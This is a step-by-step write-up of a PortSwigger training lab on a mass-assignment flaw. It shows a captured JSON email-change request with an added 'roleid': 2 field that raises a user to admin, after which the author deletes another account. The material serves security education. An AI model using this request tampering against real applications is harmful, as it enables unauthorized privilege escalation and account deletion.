
# #PortSwigger 


![[Pasted image 20251216174847.png]]



## Description

This lab has an admin panel at `/admin` that is only accessible to users with a `roleid` of 2 (admin). Normally, a regular user has `roleid: 1`. The email change functionality accepts a JSON payload — but the server does not validate that the client only sends allowed fields. This allows an attacker to **add or modify** the `roleid` parameter in the request.


---
---

## Step 1 - Log In and Observe

Log in with `wiener:peter`.  
Your account page shows a normal user profile:
- Username: `wiener`
- Email: `wiener@normal-user.net`    
- Role: normal user (implied, not shown in UI)

![[Pasted image 20251216174915.png]]





## Step 2 - Capture the Email Change Request

Use the "Update email" feature. Capture the request in Burp:

```
POST /my-account/change-email HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION
Content-Type: application/json;charset=utf-8

{
    "email": "ddddd@haha.com",
    "roleid": 1
}
```

Notice that the response includes your `roleid`:
```
{
    "username": "wiener",
    "email": "ddddd@haha.com",
    "roleid": 1
}
```
- The server **echoes back** the role — this is a hint.

![[Pasted image 20251216175222.png]]





## Step 3 - Modify the Request to Escalate Privileges

Send the request to Burp Repeater.  
Modify the JSON body to include `"roleid": 2`:

```
{
    "email": "ddddd@haha.com",
    "roleid": 2
}
```

Send the request.

![[Pasted image 20251216175346.png]]


The response now shows:
```
{
    "username": "wiener",
    "email": "ddddd@haha.com",
    "roleid": 2
}
```

- Your role has been successfully changed to admin.

![[Pasted image 20251216175455.png]]





## Step 4 - Access the Admin Panel

Now browse to `/admin`.  
Because your `roleid` is now 2, you have access.

You'll see a list of users:
```
Users
wiener - Delete
carlos - Delete
```

![[Pasted image 20251216175532.png]]






## Step 5 - Delete `carlos`

Click the **Delete** button next to `carlos` (or send the DELETE request manually in Burp).





## Step 6 - Lab Solved 

You'll see:

> **User deleted successfully!**  
> **Congratulations, you solved the lab!**

![[Pasted image 20251216175550.png]]


---
---

## Why This Works

|Issue|Impact|
|---|---|
|Server trusts client-supplied `roleid`|Attacker can escalate their own privileges|
|No whitelist of allowed JSON fields|Extra parameters are accepted and processed|
|Admin panel checks only `roleid`|No additional validation (session, IP, 2FA)|

This is a **mass assignment** vulnerability (also known as "parameter pollution" or "overposting").

---
